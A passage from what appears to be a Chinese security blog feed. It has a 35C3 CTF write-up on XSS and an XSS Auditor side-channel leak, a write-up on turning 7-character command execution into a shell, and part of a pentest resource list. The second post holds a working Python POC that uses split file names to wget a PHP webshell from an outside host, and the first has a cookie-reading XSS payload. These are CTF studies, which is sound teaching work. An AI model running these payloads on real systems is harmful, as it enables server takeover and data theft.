<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Solves: 5</span><br><span class="line"><span class="keyword">Check</span> <span class="keyword">out</span> my web-based filemanager running <span class="keyword">at</span> https://filemanager.appspot.com.</span><br><span class="line"></span><br><span class="line">The <span class="keyword">admin</span> <span class="keyword">is</span> <span class="keyword">using</span> it <span class="keyword">to</span> <span class="keyword">store</span> a flag, can you <span class="keyword">get</span> it? You can reach the <span class="keyword">admin</span><span class="string">'s chrome-headless at: nc 35.246.157.192 1</span></span><br></pre></td></tr></table></figure>

<h3 id="0x1-做题时的自己的想法"><a href="#0x1-做题时的自己的想法" class="headerlink" title="0x1 做题时的自己的想法"></a>0x1 做题时的自己的想法</h3><p>首先是测出来有一个xss漏洞，在search页面，search页面有段js如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> pre <span class="keyword">of</span> <span class="built_in">document</span>.getElementsByTagName(<span class="string">'pre'</span>)) &#123;</span><br><span class="line">        <span class="keyword">let</span> text = pre.innerHTML;</span><br><span class="line">        <span class="keyword">let</span> q = <span class="string">'test'</span>;</span><br><span class="line">        <span class="keyword">let</span> idx = text.indexOf(q);</span><br><span class="line">        pre.innerHTML = <span class="string">`<span class="subst">$&#123;text.substr(<span class="number">0</span>, idx)&#125;</span>&lt;mark&gt;<span class="subst">$&#123;q&#125;</span>&lt;/mark&gt;<span class="subst">$&#123;text.substr(idx+q.length)&#125;</span>`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>q是搜索条件，如果搜到的文件内容跟q匹配，就会显示文件内容，并把q高亮显示出来。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/12/WX20181230-111952@2x.png" alt="http://pic.wonderkun.cc/uploads/2018/12/WX20181230-111952@2x.png"></p>
<p>这里q可以引发xss，测试方法：</p>
<ol>
<li><p>上传文件名xxxxx，内容为</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">3</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">6</span>d\<span class="keyword">x</span><span class="number">67</span>\<span class="keyword">x</span><span class="number">20</span>\<span class="keyword">x</span><span class="number">73</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">3</span>d\<span class="keyword">x</span><span class="number">78</span>\<span class="keyword">x</span><span class="number">20</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">3</span>d\<span class="keyword">x</span><span class="number">61</span>\<span class="keyword">x</span><span class="number">6</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">74</span>\<span class="keyword">x</span><span class="number">28</span>\<span class="keyword">x</span><span class="number">64</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">75</span>\<span class="keyword">x</span><span class="number">6</span>d\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">74</span>\<span class="keyword">x</span><span class="number">2</span>e\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>b\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">29</span>\<span class="keyword">x</span><span class="number">3</span>b\<span class="keyword">x</span><span class="number">3</span>e</span><br></pre></td></tr></table></figure>
<p>其实就是编码后的<code>&lt;img src=x onerror=alert(document.cookie);&gt;</code></p>
</li>
<li><p>搜索</p>
</li>
</ol>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">3</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">6</span>d\<span class="keyword">x</span><span class="number">67</span>\<span class="keyword">x</span><span class="number">20</span>\<span class="keyword">x</span><span class="number">73</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">3</span>d\<span class="keyword">x</span><span class="number">78</span>\<span class="keyword">x</span><span class="number">20</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">3</span>d\<span class="keyword">x</span><span class="number">61</span>\<span class="keyword">x</span><span class="number">6</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">74</span>\<span class="keyword">x</span><span class="number">28</span>\<span class="keyword">x</span><span class="number">64</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">75</span>\<span class="keyword">x</span><span class="number">6</span>d\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">74</span>\<span class="keyword">x</span><span class="number">2</span>e\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>b\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">29</span>\<span class="keyword">x</span><span class="number">3</span>b\<span class="keyword">x</span><span class="number">3</span>e</span><br></pre></td></tr></table></figure>
<p>就会触发xss。 </p>
<p>但是有个利用条件，就是首先需要有一个包含</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">x</span><span class="number">3</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">6</span>d\<span class="keyword">x</span><span class="number">67</span>\<span class="keyword">x</span><span class="number">20</span>\<span class="keyword">x</span><span class="number">73</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">3</span>d\<span class="keyword">x</span><span class="number">78</span>\<span class="keyword">x</span><span class="number">20</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">3</span>d\<span class="keyword">x</span><span class="number">61</span>\<span class="keyword">x</span><span class="number">6</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">74</span>\<span class="keyword">x</span><span class="number">28</span>\<span class="keyword">x</span><span class="number">64</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">75</span>\<span class="keyword">x</span><span class="number">6</span>d\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">74</span>\<span class="keyword">x</span><span class="number">2</span>e\<span class="keyword">x</span><span class="number">63</span>\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>f\<span class="keyword">x</span><span class="number">6</span>b\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">65</span>\<span class="keyword">x</span><span class="number">29</span>\<span class="keyword">x</span><span class="number">3</span>b\<span class="keyword">x</span><span class="number">3</span>e</span><br></pre></td></tr></table></figure>
<p>的文档，显然管理员是没有的。。。<br>所以一直在想怎么csrf去写一个。。。创建文档的页面有个XSRF头保护，没办法csrf，就陷入了僵局。</p>
<h3 id="0x2-正解"><a href="#0x2-正解" class="headerlink" title="0x2 正解"></a>0x2 正解</h3><p>正解在这里<a href="https://gist.githubusercontent.com/Jinmo/1eb258fe22daab04245cabb971111495/raw/26cda4e3a3ebbda37cf1c483240cf693a2276437/exp.html" target="_blank" rel="noopener">https://gist.githubusercontent.com/Jinmo/1eb258fe22daab04245cabb971111495/raw/26cda4e3a3ebbda37cf1c483240cf693a2276437/exp.html</a></p>
<p>根本没有用到xss，就是直接获取管理员页面，搜flag，类似于bool盲注的效果，就这么暴力。这里不再详细说这个题解了，自己去品味一下吧。</p>
<p>如果你看完这个题解，没有感到疑惑，甚至觉得很easy，那就没必要继续往下看了。下面说的这个问题，你肯定知道。</p>
<h3 id="0x3-关于chrome-XSS-Auditor的一个小知识点"><a href="#0x3-关于chrome-XSS-Auditor的一个小知识点" class="headerlink" title="0x3 关于chrome XSS Auditor的一个小知识点"></a>0x3 关于chrome XSS Auditor的一个小知识点</h3><p>先看现象，写两个测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// filename:test.php</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            </span><br><span class="line">            $password = @$_GET[<span class="string">"password"</span>];</span><br><span class="line">            <span class="keyword">if</span>($password==<span class="string">'admin'</span>)&#123; <span class="comment">// 这里模拟我们要猜测的值</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you get it."</span> ;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;script&gt;let a='test';&lt;/script&gt;"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"guess error!"</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--filename:poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        iframe &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">f</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">log</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> myframes = [];</span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line">                myframes.push(f);</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.appendChild(f)</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> start = performance.now()</span></span><br><span class="line"><span class="actionscript">                f.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                    f.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(<span class="string">"second request!"</span>);</span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="string">"first request!"</span>);</span></span><br><span class="line"><span class="actionscript">                    f.src=f.src+<span class="string">'#'</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="handlebars"><span class="xml">                f.src = `http://localhost:8888/test.php?password=$&#123;encodeURIComponent(x)&#125;&amp;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">let</span>%<span class="number">20</span>a=%<span class="number">27</span>test%<span class="number">27</span>;<span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span><span class="string">`;</span></span></span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> payload1 = <span class="string">'admin'</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> payload2 = <span class="string">'test'</span>;</span></span><br><span class="line">            go(payload1);</span><br><span class="line">            go(payload2);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问<code>poc.html</code>，看到如下输出：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/12/WX20181230-113850@2x.png" alt="http://pic.wonderkun.cc/uploads/2018/12/WX20181230-113850@2x.png"></p>
<p>可以看到这里只发了3次请求，按照这个代码的写法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">f.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            f.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">               <span class="built_in">console</span>.log(<span class="string">"second request!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"first request!"</span>);</span><br><span class="line">            f.src=f.src+<span class="string">'#'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按照这种写法，在url后面添加一个’#’，浏览器会认为url没有被修改，是不会再重新请求一次的。那应该是2次请求，可是为啥是3次？</p>
<p>其实原因很明显了，因为页面内容被XSS Auditor拦截了之后，浏览器会认为页面根本没有加载成功，所以在url后面添加一个’#’后，浏览器会再去加载一次。</p>
<p>看一下服务端的请求日志：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[Sun Dec <span class="number">30</span> <span class="number">11</span>:<span class="number">38</span>:<span class="number">28</span> <span class="number">2018</span>] ::<span class="number">1</span>:<span class="number">54705</span> [<span class="number">200</span>]: /test.php?password=admin&amp;%<span class="number">3</span>Cscript%<span class="number">3</span>Elet%<span class="number">20</span>a=%<span class="number">27</span>test%<span class="number">27</span>;%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br><span class="line">[Sun Dec <span class="number">30</span> <span class="number">11</span>:<span class="number">38</span>:<span class="number">28</span> <span class="number">2018</span>] ::<span class="number">1</span>:<span class="number">54706</span> [<span class="number">200</span>]: /test.php?password=test&amp;%<span class="number">3</span>Cscript%<span class="number">3</span>Elet%<span class="number">20</span>a=%<span class="number">27</span>test%<span class="number">27</span>;%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br><span class="line">[Sun Dec <span class="number">30</span> <span class="number">11</span>:<span class="number">38</span>:<span class="number">28</span> <span class="number">2018</span>] ::<span class="number">1</span>:<span class="number">54711</span> [<span class="number">200</span>]: /test.php?password=admin&amp;%<span class="number">3</span>Cscript%<span class="number">3</span>Elet%<span class="number">20</span>a=%<span class="number">27</span>test%<span class="number">27</span>;%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>

<p>其中 <code>password=admin</code>这个请求会触发XSS Auditor。</p>
<p>这就给我们一个提示，我们可以把正常页面中带有的js脚本写到url中，而错误页面是没有这个脚本的，如果页面加载正常，就会触发 XSS Auditor，这时候就给我们再发一次请求的机会，从而实现数据外带，而错误页面是不会触发XSS Auditor的，所以第二次请求就不会发出，利用这种技巧在前端实现类似于bool盲注的效果。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>35c3CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>从七个字符长度的任意命令执行到GetShell</title>
    <url>/2017/02/09/%E4%BB%8E%E4%B8%83%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0GetShell/</url>
    <content><![CDATA[<p>看到phithon在圈子里发了个题，感觉好坑，记录一下我走过的套路：<br>此题的代码很简单，如下：</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要求要getshell。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>直接写shell是不可能的，因为 <code>1=echo 1&gt;1</code> 都8个字符了，已经超了</li>
<li>下载一个shell也是不可行的，<code>1=wget a.cn</code>也超了。</li>
</ol>
<p>所以需要想其他的办法。<br>@yichin告诉我，直接<code>1=&gt;filename</code>,就可以创建文件，但是<code>1=1&gt;filename</code>并没有办法把1写到文件中去，所以说这里只能够创建空文件，没有办法把内容写入到文件中去。可以利用的就只有文件名了。<br>利用文件名是否可以getshell呢？？ </p>
<p>刚想到这里，yichin说这样<code>1=ls &gt;a</code>,能否有办法写入个shell呢?  这句话一下子惊醒我了，我顿时明白了这里面套路。<br>思路是这样的：</p>
<blockquote>
<p>我们把一条长的命令拆分为多个小段，把每一段都存为文件名，然后用 <code>1=ls &gt;a</code>,创建文件a，执行a来getshell。<br>但是有一个后遗症，就是你得想办法解决好多换行的问题，下面会详细说。</p>
</blockquote>
<p>思路有了，接下来就是要动手啦，但是我却走了好多弯路，分别都说一下：</p>
<ol>
<li>开始我想把最短的shell，<code>&lt;?=`$_GET[1]`;</code>拆分为多个段，每段都做为文件名，然后ls一下重定向到一个php文件，就getshell了。想法很美好，但是现实很残酷<code>1=ls &gt;a.php</code>长度都已经超了，所以不能直接写php文件。</li>
<li>所以接下来就是想写个sh文件，执行sh文件来getshell，但是sh文件到底写啥命令？<br>是echo 一个shell到php文件，还是用wget下载一个shell呢。<br>经过我的测试 ，我发现echo一个shell貌似不行或者说很麻烦，搞了好久也没成功，主要是php语句换行的问题。<br>虽然php一条语句读到分号才算结束，中间可以有多个换行，换行不影响执行，但是换行也是都限度的，就是关键词是不可再拆分的,比如：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>`</span><br><span class="line">$_GET[<span class="number">1</span>]</span><br><span class="line">`;</span><br></pre></td></tr></table></figure>
这是可以运行的，没有问题，但是如果在<code>$_GET[1]</code>中任意一个地方添加一个换行，都是没办法运行的<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>`</span><br><span class="line">$_GET</span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">`;</span><br><span class="line"><span class="comment">//无法运行</span></span><br></pre></td></tr></table></figure>
也就是说，<code>$_GET[1]</code>是没办法再拆分的，必须是一个整体。但是长度显然是超了。<br>接下来就只有最后一个方法了，下载一个shell了。<br>经过多次测试，发现下面sh文件是可以运行的：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget\</span><br><span class="line"> a.\</span><br><span class="line">cn \</span><br><span class="line">-O \</span><br><span class="line">1.php</span><br></pre></td></tr></table></figure>
目的是到a.cn下载一个文件保存为1.php,就getshell了。<br>所以接下来我只需要把这个sh文件的每一行都存为一个文件名,然后<code>ls &gt;a</code>,<code>sh a</code>，就坐等shell了。<br>（**注意：a.cn需要换成你的域名，自己做拆分的时候需要注意一点，<code>.</code>不能放在文件名开头，因为以<code>.</code>开头的文件名是隐藏文件，ls是列不出来的）</li>
</ol>
<p>最后还有一个问题，就是ls 列出来文件名是按照字符字典[a-z]的顺序排列的，不能得到我们想要的顺序，这时候想到了按照创建时间先后排序。<br>因为 <code>ls -tr&gt;a</code>长度已经超了，所以只有用<code>ls -t&gt;a</code>了。<br><code>ls -t</code>列出来的文件顺序是:最后创建的文件在最前面，所以我们创建文件的时候要先创建最后一行<code>1.php</code>,最后创建文件<code>wget\</code></p>
<p>给个python写的POC：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://192.168.56.129/shell.php?1="</span></span><br><span class="line">    fileNames = [<span class="string">"1.php"</span>,<span class="string">"-O\ \\"</span>,<span class="string">"cn\ \\"</span>,<span class="string">"\ a.\\"</span>,<span class="string">"wget\\"</span>] </span><br><span class="line">    <span class="comment"># linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"</span></span><br><span class="line">    <span class="comment"># 可以修改hosts文件，让a.cn指向一个自己的服务器。</span></span><br><span class="line">    <span class="comment"># 在a.cn 的根目录下创建index.html ，内容是一个php shell </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        createFileUrl = url+<span class="string">"&gt;"</span>+fileName</span><br><span class="line">        <span class="keyword">print</span> createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line">   </span><br><span class="line">    getShUrl = url + <span class="string">"ls -t&gt;1"</span></span><br><span class="line">    <span class="keyword">print</span> getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl = url + <span class="string">"sh 1"</span></span><br><span class="line">    <span class="keyword">print</span> getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line"></span><br><span class="line">    shellUrl = <span class="string">"http://192.168.56.129/1.php"</span></span><br><span class="line">    response = requests.get(shellUrl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Get shell !"</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] fail!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>国外整理的一套渗透测试资源合集</title>
    <url>/2015/03/30/%E5%9B%BD%E5%A4%96%E6%95%B4%E7%90%86%E7%9A%84%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>一组很棒的渗透测试资源，包括工具、书籍、会议、杂志和其他的东西</p>
<a id="more"></a>
<ul>
<li><p>目录：</p>
<ul>
<li><p>在线资源</p>
<ul>
<li>渗透测试资源</li>
<li>Shell 脚本资源</li>
<li>Linux 资源</li>
<li>Shellcode 开发</li>
<li>Social社工资源</li>
<li>开锁资源</li>
</ul>
</li>
<li><p>工具</p>
<ul>
<li>渗透测试系统版本</li>
<li>渗透测试基础工具</li>
<li>漏洞扫描器</li>
<li>网络工具</li>
<li>Hex编辑器</li>
<li>破解</li>
<li>Windows程序</li>
<li>DDoS 工具</li>
<li>社工工具</li>
<li>藏形工具</li>
<li>逆向工具</li>
</ul>
</li>
<li><p>书籍</p>
<ul>
<li>渗透测试书籍</li>
<li>黑客手册系列</li>
<li>网络分析书籍</li>
<li>逆向工程书籍</li>
<li>恶意程序分析书籍</li>
<li>Windows书籍</li>
<li>社工书籍</li>
<li>开锁书籍</li>
</ul>
</li>
<li><p>漏洞库</p>
</li>
<li><p>安全教程</p>
</li>
<li><p>信息安全会议</p>
</li>
<li><p>信息安全杂志</p>
</li>
<li><p>其他</p>
</li>
</ul>
</li>
</ul>
<p>在线资源 渗透测试资源</p>
<ul>
<li><a href="http://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener">Metasploit Unleashed</a> – 免费的metasploit教程</li>
<li><a href="http://www.pentest-standard.org/" target="_blank" rel="noopener">PTES</a> – 渗透测试执行标准</li>
<li><a href="https://www.owasp.org/index.php/Main_Page" target="_blank" rel="noopener">OWASP</a> – 开放式Web应用程序安全项目</li>
<li><a href="http://www.isecom.org/research/osstmm.html" target="_blank" rel="noopener">OSSTMM</a> – 开源安全测试方法手册</li>
</ul>
<p>Shell 脚本资源</p>
<ul>
<li><a href="http://www.freeos.com/guides/lsst/" target="_blank" rel="noopener">LSST</a> – linux shell脚本教程</li>
</ul>
<p>Linux 资源</p>
<ul>
<li><a href="http://kernelnewbies.org/" target="_blank" rel="noopener">Kernelnewbies</a> – 一个出色的Linux内核资源的社区</li>
</ul>
<p>Shellcode 开发</p>
<ul>
<li><a href="http://www.projectshellcode.com/?q=node/12" target="_blank" rel="noopener">Shellcode Tutorials</a> – 如何编写shellcode的教程</li>
<li><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">Shellcode examples</a> – Shellcodes 的库</li>
</ul>
<p>社工资源</p>
<ul>
<li><a href="http://www.social-engineer.org/framework/" target="_blank" rel="noopener">Social Engineering Framework</a> – 一些社工的资源</li>
</ul>
<p>开锁资源</p>
<ul>
<li><a href="http://www.youtube.com/user/SchuylerTowne/" target="_blank" rel="noopener">Schuyler Towne channel</a> – 开锁视频和安全沙龙</li>
</ul>
<p>工具 渗透测试系统版本</p>
<ul>
<li><a href="http://www.kali.org/" target="_blank" rel="noopener">Kali</a> – 一个Linux发行版，用来做数字取证和渗透测试。</li>
<li><a href="http://networksecuritytoolkit.org/" target="_blank" rel="noopener">NST</a> – 网络安全工具包发行版</li>
<li><a href="http://www.pentoo.ch/" target="_blank" rel="noopener">Pentoo</a> – 着眼于安全的基于Gentoo的 LiveCD</li>
<li><a href="http://www.backbox.org/" target="_blank" rel="noopener">BackBox</a> – 基于Ubuntu的发行版，用于渗透测试及安全评估</li>
</ul>
<p>渗透测试基础工具</p>
<ul>
<li><a href="http://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a> – 应用最广的渗透测试软件</li>
<li><a href="http://portswigger.net/burp/" target="_blank" rel="noopener">Burp</a> – 抓包工具，针对Web应用执行安全检测</li>
</ul>
<p>漏洞扫描器</p>
<ul>
<li><a href="https://www.netsparker.com/communityedition/" target="_blank" rel="noopener">Netsparker</a> – Web应用安全扫描器</li>
<li><a href="https://www.rapid7.com/products/nexpose/" target="_blank" rel="noopener">Nexpose</a> – 漏洞管理&amp;风险控制软件</li>
<li><a href="http://www.tenable.com/products/nessus" target="_blank" rel="noopener">Nessus</a> – 漏洞，配置，和合规检测</li>
<li><a href="https://cirt.net/nikto2" target="_blank" rel="noopener">Nikto</a> – Web应用的漏洞扫描</li>
<li><a href="http://www.openvas.org/" target="_blank" rel="noopener">OpenVAS</a> – 开源漏洞扫描器</li>
<li><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener">OWASP Zed Attack Proxy</a> – web应用的渗透测试工具</li>
<li><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">w3af</a> – Web应用工具和审计框架</li>
<li><a href="http://wapiti.sourceforge.net/" target="_blank" rel="noopener">Wapiti</a> – Web应用漏洞</li>
</ul>
<p>网络工具</p>
<ul>
<li><a href="http://nmap.org/" target="_blank" rel="noopener">nmap</a> – 免费的安全扫描器，用于网络勘测和安全审计</li>
<li><a href="http://www.tcpdump.org/" target="_blank" rel="noopener">tcpdump/libpcap</a> – 一种常见的命令行数据包分析工具</li>
<li><a href="http://www.wireshark.org/" target="_blank" rel="noopener">Wireshark</a> – 一个Unix和Windows系统的传输协议分析工具</li>
<li><a href="http://network-tools.com/" target="_blank" rel="noopener">Network Tools</a> – 信息收集: ping, lookup, whois, 等等</li>
<li><a href="https://github.com/netsniff-ng/netsniff-ng" target="_blank" rel="noopener">netsniff-ng</a> – 网络嗅探利器</li>
<li><a href="http://intercepter.nerf.ru/" target="_blank" rel="noopener">Intercepter-NG</a> – 多功能网络工具包</li>
</ul>
<p>SSL 分析工具</p>
<ul>
<li><a href="https://github.com/nabla-c0d3/sslyze" target="_blank" rel="noopener">SSLyze</a> – SSL 配置扫描器</li>
